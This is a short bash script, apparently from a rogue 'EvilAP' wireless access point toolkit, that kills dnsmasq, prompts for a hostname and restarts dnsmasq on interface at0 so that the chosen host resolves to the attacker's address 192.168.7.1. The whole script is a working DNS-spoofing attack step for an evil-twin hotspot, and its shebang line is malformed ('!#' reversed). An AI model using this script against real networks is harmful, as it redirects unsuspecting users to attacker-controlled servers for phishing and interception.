!#/bin/bash
clear

killall dnsmasq > /dev/null

read -p "Enter a DNS host to spoof: " host

dnsmasq -i at0 --address=/$host/192.168.7.1

echo "DNSmasq running redirecting $host to EvilAP IP address 192.168.7.1"


